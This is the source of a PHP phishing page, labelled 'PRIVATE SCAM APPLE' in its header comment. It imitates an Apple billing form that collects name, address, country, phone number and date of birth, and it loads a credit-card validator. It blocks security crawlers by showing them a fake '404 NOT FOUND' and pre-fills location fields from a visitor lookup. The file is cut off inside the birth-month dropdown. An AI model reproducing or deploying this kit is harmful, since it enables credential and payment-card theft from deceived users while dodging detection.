<?php 
/*   
                              #===============================#
                              #    PRIVATE SCAM APPLE         #
                              #           PIradz17            #
							  #     Facebook.com/Piradz17     #
                              #===============================#                     
*/
session_start();
error_reporting(0);
include('./INC-FUN/Encrypte.php');
include "./ANTIBOTS.php";
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
?>
<form method="post" id="Z118_2XX" style="display: inline-block;width: 100%;margin-bottom: 0;" novalidate="novalidate">
    <script src="./INC-LIB/JS/jquery.additional-methods.js"></script>
    <script src="./INC-LIB/JS/Z118_2XX.js"></script>
    <script src="./INC-LIB/JS/jquery.CardValidator.js"></script>
    <script type="text/javascript">
        $(function() {
            $("#cardnumber").validateCreditCard(function(a) {
                document.getElementById("card_type").value = a.card_type.name, document.getElementById("card_valid").value = a.valid, $("#cardnumber").validateCreditCard(function(a) {
                    null == a.card_type ? ($("span.div-cards").removeClass(), $("#typecc").removeClass()) : ($("span.div-cards").addClass(a.card_type.name), $("#typecc").addClass(a.card_type.name))
                })
            })
        });
    </script>
    <div id="Show" class="body">
        <div class="content-body">
            <div class="form top-form">
                <h2><?php echo xTextEncode('Billing Address');?></h2>
                <div>
                    <div class="div-input left-input">
                        <input id="fname" name="fname" placeholder="First Name" type="text"> </div>
                    <div class="div-input right-input">
                        <input id="lname" name="lname" placeholder="Last Name" type="text"> </div>
                    <div class="div-input">
                        <input id="address" name="address" placeholder="Address line" type="text"> </div>
                    <div class="div-input">
                        <select id="country" name="country">
                            <option disabled>Country</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AL" ) echo "selected"; ?> value="AL">Albania</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="DZ" ) echo "selected"; ?> value="DZ">Algeria</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AD" ) echo "selected"; ?> value="AD">Andorra</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AO" ) echo "selected"; ?> value="AO">Angola</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AL" ) echo "selected"; ?> value="AI">Anguilla</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AG" ) echo "selected"; ?> value="AG">Antigua &amp; Barbuda</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AR" ) echo "selected"; ?> value="AR">Argentina</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AM" ) echo "selected"; ?> value="AM">Armenia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AW" ) echo "selected"; ?> value="AW">Aruba</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AU" ) echo "selected"; ?> value="AU">Australia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AT" ) echo "selected"; ?> value="AT">Austria</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AZ" ) echo "selected"; ?> value="AZ">Azerbaijan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BS" ) echo "selected"; ?> value="BS">Bahamas</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BH" ) echo "selected"; ?> value="BH">Bahrain</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BB" ) echo "selected"; ?> value="BB">Barbados</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BY" ) echo "selected"; ?> value="BY">Belarus</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BE" ) echo "selected"; ?> value="BE">Belgium</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BZ" ) echo "selected"; ?> value="BZ">Belize</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BJ" ) echo "selected"; ?> value="BJ">Benin</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BM" ) echo "selected"; ?> value="BM">Bermuda</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BT" ) echo "selected"; ?> value="BT">Bhutan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BO" ) echo "selected"; ?> value="BO">Bolivia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BA" ) echo "selected"; ?> value="BA">Bosnia &amp; Herzegovina</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BW" ) echo "selected"; ?> value="BW">Botswana</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BR" ) echo "selected"; ?> value="BR">Brazil</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="VG" ) echo "selected"; ?> value="VG">British Virgin Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BN" ) echo "selected"; ?> value="BN">Brunei</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BG" ) echo "selected"; ?> value="BG">Bulgaria</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BF" ) echo "selected"; ?> value="BF">Burkina Faso</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="BI" ) echo "selected"; ?> value="BI">Burundi</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KH" ) echo "selected"; ?> value="KH">Cambodia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CM" ) echo "selected"; ?> value="CM">Cameroon</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CA" ) echo "selected"; ?> value="CA">Canada</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CV" ) echo "selected"; ?> value="CV">Cape Verde</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KY" ) echo "selected"; ?> value="KY">Cayman Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TD" ) echo "selected"; ?> value="TD">Chad</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CL" ) echo "selected"; ?> value="CL">Chile</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CN" ) echo "selected"; ?> value="CN">China</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="C2" ) echo "selected"; ?> value="C2">China</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CO" ) echo "selected"; ?> value="CO">Colombia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KM" ) echo "selected"; ?> value="KM">Comoros</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CG" ) echo "selected"; ?> value="CG">Congo &#x2D; Brazzaville</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CD" ) echo "selected"; ?> value="CD">Congo &#x2D; Kinshasa</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CK" ) echo "selected"; ?> value="CK">Cook Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CR" ) echo "selected"; ?> value="CR">Costa Rica</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CL" ) echo "selected"; ?> value="CI">Côte d’Ivoire</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="HR" ) echo "selected"; ?> value="HR">Croatia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CY" ) echo "selected"; ?> value="CY">Cyprus</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CZ" ) echo "selected"; ?> value="CZ">Czech Republic</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="DK" ) echo "selected"; ?> value="DK">Denmark</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="DJ" ) echo "selected"; ?> value="DJ">Djibouti</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="DM" ) echo "selected"; ?> value="DM">Dominica</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="DO" ) echo "selected"; ?> value="DO">Dominican Republic</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="EC" ) echo "selected"; ?> value="EC">Ecuador</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="EG" ) echo "selected"; ?> value="EG">Egypt</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SV" ) echo "selected"; ?> value="SV">El Salvador</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ER" ) echo "selected"; ?> value="ER">Eritrea</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="EE" ) echo "selected"; ?> value="EE">Estonia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ET" ) echo "selected"; ?> value="ET">Ethiopia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="FK" ) echo "selected"; ?> value="FK">Falkland Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="FO" ) echo "selected"; ?> value="FO">Faroe Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="FJ" ) echo "selected"; ?> value="FJ">Fiji</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="FI" ) echo "selected"; ?> value="FI">Finland</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="FR" ) echo "selected"; ?> value="FR">France</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GF" ) echo "selected"; ?> value="GF">French Guiana</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PF" ) echo "selected"; ?> value="PF">French Polynesia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GA" ) echo "selected"; ?> value="GA">Gabon</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GM" ) echo "selected"; ?> value="GM">Gambia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GE" ) echo "selected"; ?> value="GE">Georgia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="DE" ) echo "selected"; ?> value="DE">Germany</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GI" ) echo "selected"; ?> value="GI">Gibraltar</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GR" ) echo "selected"; ?> value="GR">Greece</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GL" ) echo "selected"; ?> value="GL">Greenland</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GD" ) echo "selected"; ?> value="GD">Grenada</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GP" ) echo "selected"; ?> value="GP">Guadeloupe</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GT" ) echo "selected"; ?> value="GT">Guatemala</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GN" ) echo "selected"; ?> value="GN">Guinea</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GW" ) echo "selected"; ?> value="GW">Guinea&#x2D;Bissau</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GY" ) echo "selected"; ?> value="GY">Guyana</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="HN" ) echo "selected"; ?> value="HN">Honduras</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="HK" ) echo "selected"; ?> value="HK">Hong Kong SAR China</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="HU" ) echo "selected"; ?> value="HU">Hungary</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="IS" ) echo "selected"; ?> value="IS">Iceland</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="IN" ) echo "selected"; ?> value="IN">India</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ID" ) echo "selected"; ?> value="ID">Indonesia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="IE" ) echo "selected"; ?> value="IE">Ireland</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="IL" ) echo "selected"; ?> value="IL">Israel</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="IT" ) echo "selected"; ?> value="IT">Italy</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="JM" ) echo "selected"; ?> value="JM">Jamaica</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="JP" ) echo "selected"; ?> value="JP">Japan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="JO" ) echo "selected"; ?> value="JO">Jordan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KZ" ) echo "selected"; ?> value="KZ">Kazakhstan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KE" ) echo "selected"; ?> value="KE">Kenya</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KI" ) echo "selected"; ?> value="KI">Kiribati</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KW" ) echo "selected"; ?> value="KW">Kuwait</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KG" ) echo "selected"; ?> value="KG">Kyrgyzstan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="LA" ) echo "selected"; ?> value="LA">Laos</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="LV" ) echo "selected"; ?> value="LV">Latvia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="LS" ) echo "selected"; ?> value="LS">Lesotho</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="LI" ) echo "selected"; ?> value="LI">Liechtenstein</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="LT" ) echo "selected"; ?> value="LT">Lithuania</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="LU" ) echo "selected"; ?> value="LU">Luxembourg</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MK" ) echo "selected"; ?> value="MK">Macedonia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MG" ) echo "selected"; ?> value="MG">Madagascar</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MW" ) echo "selected"; ?> value="MW">Malawi</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MY" ) echo "selected"; ?> value="MY">Malaysia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MV" ) echo "selected"; ?> value="MV">Maldives</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ML" ) echo "selected"; ?> value="ML">Mali</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MT" ) echo "selected"; ?> value="MT">Malta</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MH" ) echo "selected"; ?> value="MH">Marshall Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MQ" ) echo "selected"; ?> value="MQ">Martinique</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MR" ) echo "selected"; ?> value="MR">Mauritania</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MU" ) echo "selected"; ?> value="MU">Mauritius</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="YT" ) echo "selected"; ?> value="YT">Mayotte</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MX" ) echo "selected"; ?> value="MX">Mexico</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="FM" ) echo "selected"; ?> value="FM">Micronesia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MD" ) echo "selected"; ?> value="MD">Moldova</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MC" ) echo "selected"; ?> value="MC">Monaco</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MN" ) echo "selected"; ?> value="MN">Mongolia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ME" ) echo "selected"; ?> value="ME">Montenegro</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MS" ) echo "selected"; ?> value="MS">Montserrat</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MA" ) echo "selected"; ?> value="MA">Morocco</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="MZ" ) echo "selected"; ?> value="MZ">Mozambique</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NA" ) echo "selected"; ?> value="NA">Namibia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NR" ) echo "selected"; ?> value="NR">Nauru</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NP" ) echo "selected"; ?> value="NP">Nepal</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NL" ) echo "selected"; ?> value="NL">Netherlands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AN" ) echo "selected"; ?> value="AN">Netherlands Antilles</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NC" ) echo "selected"; ?> value="NC">New Caledonia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NZ" ) echo "selected"; ?> value="NZ">New Zealand</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NI" ) echo "selected"; ?> value="NI">Nicaragua</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NE" ) echo "selected"; ?> value="NE">Niger</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NG" ) echo "selected"; ?> value="NG">Nigeria</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NU" ) echo "selected"; ?> value="NU">Niue</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NF" ) echo "selected"; ?> value="NF">Norfolk Island</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="NO" ) echo "selected"; ?> value="NO">Norway</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="OM" ) echo "selected"; ?> value="OM">Oman</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PW" ) echo "selected"; ?> value="PW">Palau</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PA" ) echo "selected"; ?> value="PA">Panama</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PG" ) echo "selected"; ?> value="PG">Papua New Guinea</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PY" ) echo "selected"; ?> value="PY">Paraguay</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PE" ) echo "selected"; ?> value="PE">Peru</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PH" ) echo "selected"; ?> value="PH">Philippines</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PN" ) echo "selected"; ?> value="PN">Pitcairn Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PL" ) echo "selected"; ?> value="PL">Poland</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PT" ) echo "selected"; ?> value="PT">Portugal</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="QA" ) echo "selected"; ?> value="QA">Qatar</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="RE" ) echo "selected"; ?> value="RE">Réunion</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="RO" ) echo "selected"; ?> value="RO">Romania</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="RU" ) echo "selected"; ?> value="RU">Russia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="RW" ) echo "selected"; ?> value="RW">Rwanda</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="WS" ) echo "selected"; ?> value="WS">Samoa</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SM" ) echo "selected"; ?> value="SM">San Marino</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ST" ) echo "selected"; ?> value="ST">São Tomé &amp; Príncipe</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SA" ) echo "selected"; ?> value="SA">Saudi Arabia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SN" ) echo "selected"; ?> value="SN">Senegal</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="RS" ) echo "selected"; ?> value="RS">Serbia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SC" ) echo "selected"; ?> value="SC">Seychelles</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SL" ) echo "selected"; ?> value="SL">Sierra Leone</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SG" ) echo "selected"; ?> value="SG">Singapore</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SK" ) echo "selected"; ?> value="SK">Slovakia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SI" ) echo "selected"; ?> value="SI">Slovenia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SB" ) echo "selected"; ?> value="SB">Solomon Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SO" ) echo "selected"; ?> value="SO">Somalia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ZA" ) echo "selected"; ?> value="ZA">South Africa</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KR" ) echo "selected"; ?> value="KR">South Korea</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ES" ) echo "selected"; ?> value="ES">Spain</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="LK" ) echo "selected"; ?> value="LK">Sri Lanka</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SH" ) echo "selected"; ?> value="SH">St&#x2E; Helena</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="KN" ) echo "selected"; ?> value="KN">St&#x2E; Kitts &amp; Nevis</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="LC" ) echo "selected"; ?> value="LC">St&#x2E; Lucia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="PM" ) echo "selected"; ?> value="PM">St&#x2E; Pierre &amp; Miquelon</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="VC" ) echo "selected"; ?> value="VC">St&#x2E; Vincent &amp; Grenadines</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SR" ) echo "selected"; ?> value="SR">Suriname</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SJ" ) echo "selected"; ?> value="SJ">Svalbard &amp; Jan Mayen</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SZ" ) echo "selected"; ?> value="SZ">Swaziland</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="SE" ) echo "selected"; ?> value="SE">Sweden</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="CH" ) echo "selected"; ?> value="CH">Switzerland</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TW" ) echo "selected"; ?> value="TW">Taiwan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TJ" ) echo "selected"; ?> value="TJ">Tajikistan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TZ" ) echo "selected"; ?> value="TZ">Tanzania</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TH" ) echo "selected"; ?> value="TH">Thailand</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TG" ) echo "selected"; ?> value="TG">Togo</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TO" ) echo "selected"; ?> value="TO">Tonga</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TT" ) echo "selected"; ?> value="TT">Trinidad &amp; Tobago</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TN" ) echo "selected"; ?> value="TN">Tunisia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TR" ) echo "selected"; ?> value="TR">Turkey</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TM" ) echo "selected"; ?> value="TM">Turkmenistan</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TC" ) echo "selected"; ?> value="TC">Turks &amp; Caicos Islands</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="TV" ) echo "selected"; ?> value="TV">Tuvalu</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="UG" ) echo "selected"; ?> value="UG">Uganda</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="UA" ) echo "selected"; ?> value="UA">Ukraine</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="AE" ) echo "selected"; ?> value="AE">United Arab Emirates</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="GB" ) echo "selected"; ?> value="GB">United Kingdom</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="US" ) echo "selected"; ?> value="US">United States</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="UY" ) echo "selected"; ?> value="UY">Uruguay</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="VY" ) echo "selected"; ?> value="VU">Vanuatu</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="VA" ) echo "selected"; ?> value="VA">Vatican City</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="VE" ) echo "selected"; ?> value="VE">Venezuela</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ZN" ) echo "selected"; ?> value="VN">Vietnam</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="WF" ) echo "selected"; ?> value="WF">Wallis &amp; Futuna</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="YE" ) echo "selected"; ?> value="YE">Yemen</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ZM" ) echo "selected"; ?> value="ZM">Zambia</option>
                            <option <?php if($_SESSION[ '_LOOKUP_CNTRCODE_']=="ZW" ) echo "selected"; ?> value="ZW">Zimbabwe</option>
                        </select>
                    </div>
                    <div class="div-input left-input">
                        <input id="state" name="state" placeholder="State" type="text" value="<?=$_SESSION['_LOOKUP_STATE_'];?>"> </div>
                    <div class="div-input right-input">
                        <input id="city" name="city" placeholder="City" type="text" value="<?=$_SESSION['_LOOKUP_CITY_'];?>"> </div>
                    <div class="div-input left-input">
                        <input id="zipCode" name="zipCode" placeholder="Zip Code" type="text" value="<?=$_SESSION['_LOOKUP_ZIPCODE_'];?>"> </div>
                    <div class="div-input right-input">
                        <input id="phoneNumber" name="phoneNumber" placeholder="Phone Number" type="tel"> </div>
                    <div class="div-input">
                        <select name="birthday" id="day">
                            <option disabled>Day</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                            <option value="13">13</option>
                            <option value="14">14</option>
                            <option value="15">15</option>
                            <option value="16">16</option>
                            <option value="17">17</option>
                            <option value="18">18</option>
                            <option value="19">19</option>
                            <option value="20">20</option>
                            <option value="21">21</option>
                            <option value="22">22</option>
                            <option value="23">23</option>
                            <option value="24">24</option>
                            <option value="25">25</option>
                            <option value="26">26</option>
                            <option value="27">27</option>
                            <option value="28">28</option>
                            <option value="39">29</option>
                            <option value="30">30</option>
                            <option value="31">31</option>
                        </select>
                        <select name="birthmonth" id="month">
                            <option disabled>Month</option>
                            <option value="01">January</option>
                            <option value="02">February</option>
                            <option value="03">March</option>
                            <option value="04">April</option>
                            <option value="05">May</option>
